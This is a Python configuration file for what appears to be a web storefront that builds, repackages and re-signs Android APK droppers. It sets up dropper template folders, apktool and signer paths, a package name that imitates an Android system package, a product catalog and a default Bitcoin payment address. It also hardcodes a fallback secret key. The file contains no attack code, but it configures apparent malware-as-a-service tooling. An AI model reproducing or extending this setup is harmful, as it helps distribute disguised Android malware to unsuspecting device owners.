import os
from datetime import timedelta

from dotenv import load_dotenv

load_dotenv()

BASE_DIR = os.path.abspath(os.path.dirname(__file__))


class Config:
    SECRET_KEY = os.environ.get("SECRET_KEY", "katana_secret_2026")
    MAX_CONTENT_LENGTH = 2048 * 1024 * 1024
    SESSION_COOKIE_SECURE = False
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = "Lax"
    PERMANENT_SESSION_LIFETIME = timedelta(days=30)

    TEMPLATES_AUTO_RELOAD = True

    UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
    OUTPUT_FOLDER = os.path.join(BASE_DIR, "outputs")
    STORE_CATALOG_DIR = os.path.join(BASE_DIR, "store_catalog")
    STORE_BTC_ADDRESS = os.environ.get(
        "STORE_BTC_ADDRESS",
        "bc1q9afer30l2a2ruqe2qf2kqhudymx7fl90897a74",
    )
    PUBLIC_APP_BASE_URL = os.environ.get("PUBLIC_APP_BASE_URL", "").rstrip("/")
    PUBLIC_ICONS_FOLDER = os.path.join(BASE_DIR, "outputs", "icons")
    DATA_DIR = os.path.join(BASE_DIR, "apk_dropper")
    DATA_FILE = os.path.join(DATA_DIR, "data.json")

    DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
    SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
    APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")

    SEED = 276813
    OLD_PACKAGE = "com.android.system.qspaas"


def ensure_directories(config):
    for directory in (
        config.UPLOAD_FOLDER,
        config.OUTPUT_FOLDER,
        config.DATA_DIR,
        config.STORE_CATALOG_DIR,
        config.PUBLIC_ICONS_FOLDER,
    ):
        os.makedirs(directory, exist_ok=True)
